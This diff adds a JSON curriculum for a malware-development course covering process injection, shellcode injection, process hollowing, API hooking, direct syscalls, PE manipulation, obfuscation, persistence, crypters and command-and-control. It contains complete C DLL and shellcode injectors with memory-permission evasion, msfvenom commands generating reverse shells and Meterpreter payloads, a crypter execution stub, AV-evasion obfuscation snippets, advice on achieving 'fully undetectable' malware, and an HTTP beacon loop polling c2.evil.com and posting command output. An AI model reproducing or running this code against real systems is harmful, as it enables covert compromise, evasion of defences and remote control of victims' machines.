@@ -1,0 +1,206 @@
+{
+  "techniques": [
+    {
+      "id": "process_injection",
+      "title": "Process Injection Fundamentals",
+      "category": "Code Injection",
+      "difficulty": "beginner",
+      "estimated_minutes": 45,
+      "prerequisites": [],
+      "description": "Learn the foundational technique of injecting code into running processes to evade detection and gain execution context.",
+      "modules": [
+        {
+          "module_number": 1,
+          "title": "Introduction to Process Injection",
+          "type": "theory",
+          "content": "# Process Injection Overview\n\nProcess injection is a technique used to execute arbitrary code within the address space of a separate live process. This is fundamental to malware development and red team operations.\n\n## Why Process Injection?\n\n- **Evasion**: Execute code under a legitimate process (e.g., explorer.exe, svchost.exe)\n- **Persistence**: Survive process termination by migrating to stable processes\n- **Privilege Escalation**: Inject into higher-privileged processes\n- **Defense Evasion**: Bypass application whitelisting and security controls\n\n## Key Concepts\n\n1. **Virtual Memory**: Understanding process address spaces\n2. **Memory Permissions**: Read, Write, Execute (RWX) permissions\n3. **Windows API**: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread\n4. **Process Handles**: Obtaining and using process handles with proper access rights\n\n## Common Target Processes\n\n- `explorer.exe` - Windows Explorer (always running)\n- `svchost.exe` - Service Host processes (multiple instances)\n- `RuntimeBroker.exe` - Windows Runtime Broker\n- Custom legitimate applications\n\n## Detection Landscape\n\nModern EDR/AV solutions monitor:\n- Cross-process memory writes\n- Remote thread creation\n- Suspicious API call sequences\n- Memory with RWX permissions"
+        },
+        {
+          "module_number": 2,
+          "title": "Classic DLL Injection - Theory",
+          "type": "theory",
+          "content": "# Classic DLL Injection\n\nThe most straightforward process injection technique involving loading a malicious DLL into a target process.\n\n## Injection Steps\n\n1. **Open Target Process**: Obtain handle with PROCESS_ALL_ACCESS\n2. **Allocate Memory**: Use VirtualAllocEx to allocate space for DLL path\n3. **Write DLL Path**: Use WriteProcessMemory to write the DLL path string\n4. **Get LoadLibrary Address**: Retrieve address of LoadLibraryA from kernel32.dll\n5. **Create Remote Thread**: Use CreateRemoteThread with LoadLibrary as start address\n6. **LoadLibrary Executes**: Target process loads our DLL, DllMain runs\n\n## Memory Layout\n\n```\nTarget Process Memory:\n[Existing Code]\n[Existing Data]\n[Allocated Buffer] <- \"C:\\\\malicious.dll\" (our DLL path)\n[Existing Heap]\n```\n\n## Why LoadLibrary?\n\nLoadLibraryA/W is a documented Windows API that:\n- Loads a DLL into the calling process\n- Executes the DLL's entry point (DllMain)\n- Is present in every Windows process (via kernel32.dll)\n- Has a convenient signature: `HMODULE LoadLibraryA(LPCSTR lpLibFileName)`\n\n## Advantages\n\n- Simple to implement\n- Works across all Windows versions\n- Well-documented technique\n\n## Disadvantages\n\n- Highly detected by modern EDR\n- Leaves obvious artifacts (DLL on disk, loaded module)\n- Requires DLL file on disk"
+        },
+        {
+          "module_number": 3,
+          "title": "Classic DLL Injection - Code Implementation",
+          "type": "code",
+          "content": "# Implementation: Classic DLL Injection\n\nLet's implement a complete DLL injector in C.\n\n## Main Injector Code\n\n```c\n#include <windows.h>\n#include <stdio.h>\n\nBOOL InjectDLL(DWORD processId, const char* dllPath) {\n    HANDLE hProcess = NULL;\n    LPVOID pRemoteBuffer = NULL;\n    HANDLE hThread = NULL;\n    BOOL success = FALSE;\n\n    // Step 1: Open target process\n    hProcess = OpenProcess(\n        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,\n        FALSE,\n        processId\n    );\n    \n    if (hProcess == NULL) {\n        printf(\"[!] Failed to open process: %d\\n\", GetLastError());\n        return FALSE;\n    }\n    printf(\"[+] Obtained handle to process %d\\n\", processId);\n\n    // Step 2: Allocate memory in target process\n    size_t dllPathLen = strlen(dllPath) + 1;\n    pRemoteBuffer = VirtualAllocEx(\n        hProcess,\n        NULL,\n        dllPathLen,\n        MEM_COMMIT | MEM_RESERVE,\n        PAGE_READWRITE\n    );\n    \n    if (pRemoteBuffer == NULL) {\n        printf(\"[!] Failed to allocate memory: %d\\n\", GetLastError());\n        CloseHandle(hProcess);\n        return FALSE;\n    }\n    printf(\"[+] Allocated %zu bytes at 0x%p\\n\", dllPathLen, pRemoteBuffer);\n\n    // Step 3: Write DLL path to target process\n    SIZE_T bytesWritten = 0;\n    if (!WriteProcessMemory(\n        hProcess,\n        pRemoteBuffer,\n        dllPath,\n        dllPathLen,\n        &bytesWritten\n    )) {\n        printf(\"[!] Failed to write memory: %d\\n\", GetLastError());\n        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);\n        CloseHandle(hProcess);\n        return FALSE;\n    }\n    printf(\"[+] Wrote %zu bytes to target process\\n\", bytesWritten);\n\n    // Step 4: Get address of LoadLibraryA\n    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(\n        GetModuleHandleA(\"kernel32.dll\"),\n        \"LoadLibraryA\"\n    );\n    \n    if (pLoadLibrary == NULL) {\n        printf(\"[!] Failed to get LoadLibraryA address\\n\");\n        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);\n        CloseHandle(hProcess);\n        return FALSE;\n    }\n    printf(\"[+] LoadLibraryA at 0x%p\\n\", pLoadLibrary);\n\n    // Step 5: Create remote thread\n    hThread = CreateRemoteThread(\n        hProcess,\n        NULL,\n        0,\n        (LPTHREAD_START_ROUTINE)pLoadLibrary,\n        pRemoteBuffer,\n        0,\n        NULL\n    );\n    \n    if (hThread == NULL) {\n        printf(\"[!] Failed to create remote thread: %d\\n\", GetLastError());\n        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);\n        CloseHandle(hProcess);\n        return FALSE;\n    }\n    printf(\"[+] Remote thread created!\\n\");\n\n    // Wait for thread to complete\n    WaitForSingleObject(hThread, INFINITE);\n    printf(\"[+] DLL injection complete\\n\");\n\n    success = TRUE;\n\n    // Cleanup\n    CloseHandle(hThread);\n    VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);\n    CloseHandle(hProcess);\n\n    return success;\n}\n\nint main(int argc, char* argv[]) {\n    if (argc != 3) {\n        printf(\"Usage: %s <PID> <DLL_PATH>\\n\", argv[0]);\n        return 1;\n    }\n\n    DWORD pid = atoi(argv[1]);\n    const char* dllPath = argv[2];\n\n    printf(\"[*] Injecting %s into PID %d...\\n\", dllPath, pid);\n    \n    if (InjectDLL(pid, dllPath)) {\n        printf(\"[+] Success!\\n\");\n        return 0;\n    } else {\n        printf(\"[-] Injection failed\\n\");\n        return 1;\n    }\n}\n```\n\n## Example DLL (Payload)\n\n```c\n#include <windows.h>\n#include <stdio.h>\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {\n    switch (dwReason) {\n        case DLL_PROCESS_ATTACH:\n            // This runs when DLL is loaded\n            MessageBoxA(NULL, \"DLL Injected Successfully!\", \"Injected\", MB_OK);\n            // Your malicious code here\n            break;\n        \n        case DLL_PROCESS_DETACH:\n            // Cleanup\n            break;\n    }\n    return TRUE;\n}\n```\n\n## Compilation\n\n```bash\n# Compile the injector\ngcc injector.c -o injector.exe\n\n# Compile the DLL\ngcc -shared payload.c -o payload.dll\n\n# Run\ninjector.exe 1234 C:\\\\path\\\\to\\\\payload.dll\n```",
+          "code_examples": [
+            {
+              "language": "c",
+              "title": "Complete DLL Injector",
+              "filename": "injector.c",
+              "description": "Full implementation of classic DLL injection"
+            }
+          ]
+        },
+        {
+          "module_number": 4,
+          "title": "Hands-On Lab: DLL Injection",
+          "type": "lab",
+          "content": "# Lab Exercise: DLL Injection\n\n## Objective\n\nImplement and test DLL injection against a benign target process.\n\n## Setup\n\n1. **Create a test target**: Use notepad.exe or write a simple infinite loop program\n2. **Build the injector**: Compile the injector code from Module 3\n3. **Create a test DLL**: Start with a simple MessageBox payload\n\n## Tasks\n\n### Task 1: Basic Injection\n\n1. Start notepad.exe\n2. Find its PID using Task Manager or `tasklist`\n3. Inject your DLL: `injector.exe <PID> payload.dll`\n4. Verify the MessageBox appears\n\n### Task 2: Stealth Improvements\n\nModify the injector to:\n- Find process by name instead of requiring PID\n- Clean up the allocated memory after injection\n- Add error handling for all API calls\n\n### Task 3: Detection Analysis\n\n1. Run Process Hacker or Process Explorer\n2. Observe the injected DLL in the target's module list\n3. Check memory regions for RWX permissions\n4. Note: This is why this technique is easily detected!\n\n## Expected Results\n\n✅ DLL successfully loads in target process\n✅ DllMain executes (MessageBox appears)\n✅ DLL appears in target's loaded modules\n✅ Remote thread visible in thread list\n\n## Common Issues\n\n**Access Denied**: Run as Administrator or target lower-privileged process\n**DLL Not Found**: Use absolute path to DLL\n**Injection Fails Silently**: Check DLL architecture matches target (x86 vs x64)\n\n## Challenge\n\nCan you inject into a protected process like `csrss.exe`? Why or why not?"
+        }
+      ]
+    },
+    {
+      "id": "shellcode_injection",
+      "title": "Shellcode Injection Techniques",
+      "category": "Code Injection",
+      "difficulty": "intermediate",
+      "estimated_minutes": 60,
+      "prerequisites": ["process_injection"],
+      "description": "Learn to inject raw shellcode instead of DLLs for fileless execution and advanced evasion.",
+      "modules": [
+        {
+          "module_number": 1,
+          "title": "Understanding Shellcode",
+          "type": "theory",
+          "content": "# Shellcode Fundamentals\n\nShellcode is position-independent machine code designed to be injected and executed in memory without relying on external files.\n\n## What is Shellcode?\n\n- **Raw bytes**: Direct CPU instructions (x86/x64 assembly)\n- **Position-independent**: Works regardless of memory address\n- **Self-contained**: No external dependencies (no imports)\n- **Compact**: Typically small size (few KB)\n\n## Why Shellcode Over DLLs?\n\n✅ **Fileless**: No DLL on disk to scan\n✅ **Stealthier**: No module entry in PEB\n✅ **Flexible**: Can be generated on-the-fly\n✅ **Portable**: Easier to embed in exploits\n\n## Shellcode Types\n\n1. **Staged**: Downloads and executes second-stage payload\n2. **Stageless**: Complete payload in one chunk\n3. **Reflective**: Loads itself into memory\n4. **Position-Independent Code (PIC)**: Runs from any address\n\n## Injection vs DLL Method\n\n| Aspect | DLL Injection | Shellcode Injection |\n|--------|--------------|--------------------|\n| Disk presence | DLL file required | No file needed |\n| Detection | Module in PEB | No module entry |\n| Flexibility | Fixed DLL | Dynamic payload |\n| Complexity | Simple LoadLibrary | Manual execution setup |\n| AV/EDR evasion | Low | Higher |\n\n## Shellcode Structure Example\n\n```asm\n; Position-independent shellcode skeleton\nstart:\n    call get_delta          ; Get current position\nget_delta:\n    pop rbx                 ; RBX = current RIP\n    sub rbx, offset get_delta ; RBX = base address\n    \n    ; Now we can access data relative to RBX\n    lea rcx, [rbx + offset_to_data]\n    ; ... execute payload ...\n    ret\n```"
+        },
+        {
+          "module_number": 2,
+          "title": "Shellcode Injection Implementation",
+          "type": "code",
+          "content": "# Implementing Shellcode Injection\n\n## Complete Shellcode Injector\n\n```c\n#include <windows.h>\n#include <stdio.h>\n\n// Simple MessageBox shellcode (x64)\n// Generated with msfvenom: msfvenom -p windows/x64/messagebox -f c\nunsigned char shellcode[] = \n    \"\\x48\\x83\\xEC\\x28\\x48\\x83\\xE4\\xF0\\x48\\x8D\\x0D\\x1A\\x00\\x00\\x00\"\n    \"\\x48\\x8D\\x15\\x1B\\x00\\x00\\x00\\x45\\x31\\xC0\\x45\\x31\\xC9\\xE8\\x08\"\n    \"\\x00\\x00\\x00\\x48\\x83\\xC4\\x28\\xC3\\xFF\\x25\\x00\\x00\\x00\\x00\\x00\"\n    \"\\x00\\x00\\x00\\x4D\\x65\\x73\\x73\\x61\\x67\\x65\\x42\\x6F\\x78\\x00\\x48\"\n    \"\\x65\\x6C\\x6C\\x6F\\x20\\x66\\x72\\x6F\\x6D\\x20\\x73\\x68\\x65\\x6C\\x6C\"\n    \"\\x63\\x6F\\x64\\x65\\x21\\x00\";\n\nBOOL InjectShellcode(DWORD processId, unsigned char* payload, SIZE_T payloadSize) {\n    HANDLE hProcess = NULL;\n    LPVOID pRemoteBuffer = NULL;\n    HANDLE hThread = NULL;\n    BOOL success = FALSE;\n\n    printf(\"[*] Opening target process %d...\\n\", processId);\n    \n    // Open target process with required permissions\n    hProcess = OpenProcess(\n        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | \n        PROCESS_VM_WRITE | PROCESS_VM_READ,\n        FALSE,\n        processId\n    );\n    \n    if (hProcess == NULL) {\n        printf(\"[!] Failed to open process: %d\\n\", GetLastError());\n        return FALSE;\n    }\n    printf(\"[+] Process handle obtained: 0x%p\\n\", hProcess);\n\n    // Allocate RWX memory in target process\n    printf(\"[*] Allocating %zu bytes in target process...\\n\", payloadSize);\n    pRemoteBuffer = VirtualAllocEx(\n        hProcess,\n        NULL,\n        payloadSize,\n        MEM_COMMIT | MEM_RESERVE,\n        PAGE_EXECUTE_READWRITE  // RWX - detected by EDR!\n    );\n    \n    if (pRemoteBuffer == NULL) {\n        printf(\"[!] Failed to allocate memory: %d\\n\", GetLastError());\n        CloseHandle(hProcess);\n        return FALSE;\n    }\n    printf(\"[+] Allocated RWX memory at 0x%p\\n\", pRemoteBuffer);\n\n    // Write shellcode to allocated memory\n    printf(\"[*] Writing %zu bytes of shellcode...\\n\", payloadSize);\n    SIZE_T bytesWritten = 0;\n    if (!WriteProcessMemory(\n        hProcess,\n        pRemoteBuffer,\n        payload,\n        payloadSize,\n        &bytesWritten\n    )) {\n        printf(\"[!] Failed to write memory: %d\\n\", GetLastError());\n        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);\n        CloseHandle(hProcess);\n        return FALSE;\n    }\n    printf(\"[+] Wrote %zu bytes successfully\\n\", bytesWritten);\n\n    // Create remote thread pointing to shellcode\n    printf(\"[*] Creating remote thread at shellcode address...\\n\");\n    hThread = CreateRemoteThread(\n        hProcess,\n        NULL,\n        0,\n        (LPTHREAD_START_ROUTINE)pRemoteBuffer,  // Entry point = our shellcode!\n        NULL,\n        0,\n        NULL\n    );\n    \n    if (hThread == NULL) {\n        printf(\"[!] Failed to create remote thread: %d\\n\", GetLastError());\n        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);\n        CloseHandle(hProcess);\n        return FALSE;\n    }\n    printf(\"[+] Remote thread created! Shellcode executing...\\n\");\n\n    // Wait for shellcode execution\n    WaitForSingleObject(hThread, INFINITE);\n    printf(\"[+] Shellcode execution complete\\n\");\n\n    success = TRUE;\n\n    // Cleanup\n    CloseHandle(hThread);\n    VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);\n    CloseHandle(hProcess);\n\n    return success;\n}\n\nint main(int argc, char* argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s <PID>\\n\", argv[0]);\n        return 1;\n    }\n\n    DWORD pid = atoi(argv[1]);\n    SIZE_T shellcodeSize = sizeof(shellcode);\n\n    printf(\"[*] Shellcode Injector\\n\");\n    printf(\"[*] Target PID: %d\\n\", pid);\n    printf(\"[*] Shellcode size: %zu bytes\\n\", shellcodeSize);\n    printf(\"\\n\");\n    \n    if (InjectShellcode(pid, shellcode, shellcodeSize)) {\n        printf(\"\\n[+] Injection successful!\\n\");\n        return 0;\n    } else {\n        printf(\"\\n[-] Injection failed\\n\");\n        return 1;\n    }\n}\n```\n\n## Generating Custom Shellcode\n\n```bash\n# Generate calc.exe popup (x64)\nmsfvenom -p windows/x64/exec CMD=calc.exe -f c\n\n# Generate reverse shell (x64)\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c\n\n# Generate Meterpreter (x64)\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c\n```\n\n## RW -> RX Memory (Evasion)\n\n```c\n// Allocate as RW first (less suspicious)\npRemoteBuffer = VirtualAllocEx(\n    hProcess, NULL, payloadSize,\n    MEM_COMMIT | MEM_RESERVE,\n    PAGE_READWRITE  // RW only\n);\n\n// Write shellcode\nWriteProcessMemory(hProcess, pRemoteBuffer, payload, payloadSize, NULL);\n\n// Change to RX before execution\nDWORD oldProtect;\nVirtualProtectEx(\n    hProcess,\n    pRemoteBuffer,\n    payloadSize,\n    PAGE_EXECUTE_READ,  // Now RX\n    &oldProtect\n);\n\n// Create thread (memory is now executable)\nCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);\n```"
+        }
+      ]
+    },
+    {
+      "id": "process_hollowing",
+      "title": "Process Hollowing",
+      "category": "Code Injection",
+      "difficulty": "advanced",
+      "estimated_minutes": 75,
+      "prerequisites": ["process_injection", "shellcode_injection"],
+      "description": "Master the technique of creating a suspended process and replacing its memory with malicious code.",
+      "modules": [
+        {
+          "module_number": 1,
+          "title": "Process Hollowing Concepts",
+          "type": "theory",
+          "content": "# Process Hollowing (RunPE)\n\nProcess hollowing is an advanced code injection technique where you create a legitimate process in suspended state, hollow out its memory, and replace it with malicious code.\n\n## How It Works\n\n1. **Create Suspended Process**: Start legitimate process (e.g., svchost.exe) with CREATE_SUSPENDED flag\n2. **Unmap Original Code**: Use NtUnmapViewOfSection to remove legitimate code\n3. **Allocate New Memory**: Allocate memory at preferred base address\n4. **Write Malicious PE**: Write your malicious executable into the hollowed process\n5. **Fix Relocations**: Adjust addresses if base address differs\n6. **Set Entry Point**: Update EIP/RIP to point to malicious entry point\n7. **Resume Thread**: Resume main thread to execute malicious code\n\n## Why Process Hollowing?\n\n✅ **Appears Legitimate**: Process name and path look benign (e.g., svchost.exe)\n✅ **Parent-Child Relationship**: Proper PPID if spawned from legitimate parent\n✅ **Memory-Only**: Original file remains unchanged on disk\n✅ **Evasion**: Bypasses application whitelisting (running svchost.exe is normal)\n\n## Detection Challenges\n\nDefenders look for:\n- Memory regions not backed by files on disk\n- Unusual parent-child relationships\n- Mismatched image paths and loaded modules\n- Suspended process creation followed by memory writes\n\n## Process Hollowing vs Other Techniques\n\n| Technique | Stealth | Complexity | Detection Difficulty |\n|-----------|---------|------------|---------------------|\n| DLL Injection | Low | Low | Easy |\n| Shellcode Injection | Medium | Medium | Medium |\n| Process Hollowing | High | High | Hard |\n| Process Doppelgänging | Very High | Very High | Very Hard |"
+        }
+      ]
+    },
+    {
+      "id": "api_hooking",
+      "title": "API Hooking and Inline Patching",
+      "category": "Defense Evasion",
+      "difficulty": "advanced",
+      "estimated_minutes": 90,
+      "prerequisites": ["process_injection"],
+      "description": "Learn to intercept and modify API calls using inline hooks, detours, and IAT manipulation.",
+      "modules": [
+        {
+          "module_number": 1,
+          "title": "Introduction to API Hooking",
+          "type": "theory",
+          "content": "# API Hooking Fundamentals\n\nAPI hooking is the technique of intercepting function calls to modify behavior, log activity, or bypass security controls.\n\n## What is API Hooking?\n\n- **Interception**: Redirect function calls to your code\n- **Modification**: Change parameters or return values\n- **Monitoring**: Log API usage for analysis\n- **Evasion**: Bypass security APIs (e.g., hook NtWriteFile to hide file writes)\n\n## Hook Types\n\n### 1. IAT Hooking (Import Address Table)\n- Modify function pointers in PE import table\n- Easy to implement\n- Only affects imports, not direct calls\n\n### 2. Inline Hooking\n- Overwrite function prologue with JMP instruction\n- Catches all calls (imports and dynamic)\n- More complex, requires code cave or trampoline\n\n### 3. SSDT Hooking (Kernel)\n- Modify System Service Descriptor Table\n- Requires kernel access\n- Highly detected by PatchGuard\n\n## Use Cases\n\n**Red Team**:\n- Bypass EDR hooks (unhooking)\n- Hide malicious activity\n- Credential harvesting\n\n**Blue Team**:\n- Monitor suspicious API calls\n- Detect hooking attempts\n- Runtime security controls"
+        }
+      ]
+    },
+    {
+      "id": "syscalls_direct",
+      "title": "Direct Syscalls & Unhooking",
+      "category": "Defense Evasion",
+      "difficulty": "advanced",
+      "estimated_minutes": 80,
+      "prerequisites": ["api_hooking"],
+      "description": "Bypass userland hooks by making direct system calls and implementing unhooking techniques.",
+      "modules": [
+        {
+          "module_number": 1,
+          "title": "Understanding System Calls",
+          "type": "theory",
+          "content": "# Direct System Calls\n\nDirect syscalls bypass user-mode hooks placed by EDR/AV by calling directly into the kernel.\n\n## The Windows API Call Chain\n\n```\nYour Code\n   ↓\nWin32 API (kernel32.dll) ← EDR hooks here\n   ↓  \nNative API (ntdll.dll) ← EDR also hooks here\n   ↓\nSyscall instruction\n   ↓\nKernel (ntoskrnl.exe)\n```\n\n## Why Direct Syscalls?\n\nEDR products hook ntdll.dll functions like:\n- `NtAllocateVirtualMemory`\n- `NtWriteVirtualMemory`\n- `NtCreateThreadEx`\n- `NtProtectVirtualMemory`\n\n**Solution**: Skip ntdll entirely and execute syscalls directly!\n\n## Syscall Instruction\n\n```asm\n; x64 syscall format\nmov r10, rcx           ; Windows x64 calling convention\nmov eax, <syscall_number>  ; e.g., 0x18 for NtAllocateVirtualMemory\nsyscall                ; Enter kernel mode\nret\n```\n\n## Techniques\n\n1. **Hell's Gate**: Parse ntdll to find syscall numbers dynamically\n2. **Halo's Gate**: Improved Hell's Gate that handles hooked functions\n3. **SysWhispers**: Generate syscall stubs from syscall tables\n4. **Tartaru's Gate**: Combines multiple techniques for resilience"
+        }
+      ]
+    },
+    {
+      "id": "pe_manipulation",
+      "title": "PE File Format Manipulation",
+      "category": "Evasion",
+      "difficulty": "intermediate",
+      "estimated_minutes": 70,
+      "prerequisites": [],
+      "description": "Understand and manipulate Portable Executable (PE) file structure for evasion and payload embedding.",
+      "modules": [
+        {
+          "module_number": 1,
+          "title": "PE File Structure",
+          "type": "theory",
+          "content": "# Portable Executable (PE) Format\n\nThe PE format is the executable file format for Windows (EXE, DLL, SYS, etc.).\n\n## PE Structure Overview\n\n```\n[DOS Header (MZ)]\n[DOS Stub]\n[PE Signature (PE\\0\\0)]\n[COFF Header]\n[Optional Header]\n[Section Table]\n[Sections (.text, .data, .rdata, etc.)]\n```\n\n## Key Components\n\n### DOS Header (IMAGE_DOS_HEADER)\n- Magic number: `MZ` (0x5A4D)\n- e_lfanew: Offset to PE header\n\n### PE Header (IMAGE_NT_HEADERS)\n- Signature: `PE\\0\\0`\n- File Header (COFF)\n- Optional Header (IMAGE_OPTIONAL_HEADER)\n\n### Section Table\n- `.text`: Code section (executable)\n- `.data`: Initialized data (writable)\n- `.rdata`: Read-only data (imports, exports)\n- `.rsrc`: Resources (icons, manifests)\n\n## Why Manipulate PE Files?\n\n✅ **Payload Embedding**: Hide shellcode in slack space or new sections\n✅ **Evasion**: Modify headers to avoid signatures\n✅ **Code Caves**: Insert code in unused PE regions\n✅ **Import Obfuscation**: Hide malicious API calls\n✅ **Packing**: Compress and encrypt code sections"
+        }
+      ]
+    },
+    {
+      "id": "obfuscation",
+      "title": "Code Obfuscation Techniques",
+      "category": "Evasion",
+      "difficulty": "intermediate",
+      "estimated_minutes": 55,
+      "prerequisites": [],
+      "description": "Learn string obfuscation, control flow flattening, and anti-analysis techniques.",
+      "modules": [
+        {
+          "module_number": 1,
+          "title": "Obfuscation Fundamentals",
+          "type": "theory",
+          "content": "# Code Obfuscation\n\nObfuscation makes code difficult to analyze while preserving functionality.\n\n## Obfuscation Goals\n\n1. **Evade Signatures**: Change static patterns AV looks for\n2. **Hinder Analysis**: Make reverse engineering time-consuming\n3. **Hide Intent**: Obscure malicious behavior\n4. **Polymorphism**: Each sample looks different\n\n## Obfuscation Layers\n\n### String Obfuscation\n```c\n// Bad: Cleartext strings flagged by AV\nLoadLibraryA(\"kernel32.dll\");\n\n// Good: XOR encrypted at compile time\nchar enc[] = {0x6B^0xAA, 0x65^0xAA, ...};\nfor(int i=0; i<len; i++) enc[i] ^= 0xAA;\nLoadLibraryA(enc);\n```\n\n### API Obfuscation\n```c\n// Bad: Direct imports visible in IAT\nVirtualAlloc(...)\n\n// Good: Dynamic resolution\ntypedef LPVOID (WINAPI *pVirtualAlloc)(...);\npVirtualAlloc myVA = (pVirtualAlloc)GetProcAddress(\n    GetModuleHandleA(decrypt(\"kernel32.dll\")),\n    decrypt(\"VirtualAlloc\")\n);\nmyVA(...);\n```\n\n### Control Flow Obfuscation\n- **Opaque Predicates**: Always-true/false conditions that confuse disassemblers\n- **Control Flow Flattening**: Linearize code with dispatcher loop\n- **Junk Code Insertion**: Add meaningless instructions"
+        }
+      ]
+    },
+    {
+      "id": "persistence",
+      "title": "Persistence Mechanisms",
+      "category": "Persistence",
+      "difficulty": "beginner",
+      "estimated_minutes": 50,
+      "prerequisites": [],
+      "description": "Implement various persistence techniques to survive reboots and maintain access.",
+      "modules": [
+        {
+          "module_number": 1,
+          "title": "Persistence Overview",
+          "type": "theory",
+          "content": "# Persistence Techniques\n\nPersistence ensures malware survives system reboots and maintains access.\n\n## Common Persistence Methods\n\n### 1. Registry Run Keys\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n```\n\n### 2. Scheduled Tasks\n- Create task to run at startup/login\n- More flexible than Run keys\n- Supports triggers and conditions\n\n### 3. Services\n- Run with SYSTEM privileges\n- Start automatically at boot\n- Harder to detect for users\n\n### 4. WMI Event Subscriptions\n- Trigger on system events\n- Very stealthy\n- Requires admin privileges\n\n### 5. Startup Folder\n```\nC:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n```\n\n## Detection Difficulty\n\n| Method | Stealth | Privilege | Detection |\n|--------|---------|-----------|----------|\n| Run Keys | Low | User | Easy |\n| Scheduled Task | Medium | User | Medium |\n| Service | Medium | Admin | Medium |\n| WMI Subscription | High | Admin | Hard |"
+        }
+      ]
+    },
+    {
+      "id": "crypters_packers",
+      "title": "Crypters and Packers",
+      "category": "Evasion",
+      "difficulty": "advanced",
+      "estimated_minutes": 85,
+      "prerequisites": ["pe_manipulation", "obfuscation"],
+      "description": "Build custom crypters and packers to evade static analysis and signature detection.",
+      "modules": [
+        {
+          "module_number": 1,
+          "title": "Packers vs Crypters",
+          "type": "theory",
+          "content": "# Packers and Crypters\n\n## Definitions\n\n**Packer**: Compresses executable to reduce size\n- Original purpose: Reduce file size\n- Side effect: Obfuscates code\n- Examples: UPX, ASPack, Themida\n\n**Crypter**: Encrypts executable to evade detection\n- Primary purpose: AV evasion\n- Decrypts at runtime (stub)\n- Can be polymorphic (changes per build)\n\n## How Crypters Work\n\n```\n1. Encrypt original payload with key\n2. Prepend decryption stub\n3. At runtime:\n   - Stub allocates RWX memory\n   - Decrypts payload into memory\n   - Jumps to decrypted entry point\n```\n\n## Stub Types\n\n### Basic Stub\n```c\nvoid* mem = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nDecrypt(encrypted_payload, mem, key);\n((void(*)())mem)();  // Execute decrypted code\n```\n\n### Advanced Stub\n- Reflective PE loading\n- Manual import resolution\n- Anti-debugging checks\n- Sandbox detection\n\n## FUD (Fully Undetectable)\n\nTo achieve FUD:\n1. Custom crypter (not public)\n2. Polymorphic stub (changes per build)\n3. Anti-emulation techniques\n4. Code signing (expensive but effective)\n5. Regular testing against AV engines"
+        }
+      ]
+    },
+    {
+      "id": "c2_protocols",
+      "title": "Command & Control Protocols",
+      "category": "Command and Control",
+      "difficulty": "intermediate",
+      "estimated_minutes": 65,
+      "prerequisites": [],
+      "description": "Design and implement stealthy C2 communication channels using HTTP, DNS, and custom protocols.",
+      "modules": [
+        {
+          "module_number": 1,
+          "title": "C2 Communication Basics",
+          "type": "theory",
+          "content": "# Command & Control (C2)\n\nC2 infrastructure enables remote control of implants and data exfiltration.\n\n## C2 Components\n\n1. **Server**: Receives connections, sends commands\n2. **Implant**: Beacon on infected host\n3. **Protocol**: Communication method\n4. **Channel**: Network pathway\n\n## Common Protocols\n\n### HTTP/HTTPS (Most Common)\n✅ Blends with normal traffic\n✅ Works through proxies\n✅ Easy to implement\n❌ Easy to detect with proper monitoring\n\n```c\n// Simple HTTP beacon\nwhile(1) {\n    char* cmd = HttpGet(\"http://c2.evil.com/tasks\");\n    char* output = ExecuteCommand(cmd);\n    HttpPost(\"http://c2.evil.com/results\", output);\n    Sleep(60000);  // 60 second sleep\n}\n```\n\n### DNS Tunneling\n✅ Works in restrictive environments\n✅ Hard to block (DNS always allowed)\n❌ Slow bandwidth\n❌ Generates unusual DNS queries\n\n### Custom TCP/UDP\n✅ Full control over protocol\n✅ Can mimic legitimate protocols\n❌ Requires open ports\n❌ Easier to fingerprint\n\n## Beaconing Strategies\n\n- **Sleep Jitter**: Randomize sleep intervals to avoid patterns\n- **Domain Fronting**: Hide C2 behind CDN\n- **Protocol Tunneling**: Encapsulate C2 in legitimate protocols\n- **Peer-to-Peer**: Mesh network of implants"
+        }
+      ]
+    }
+  ]
+}
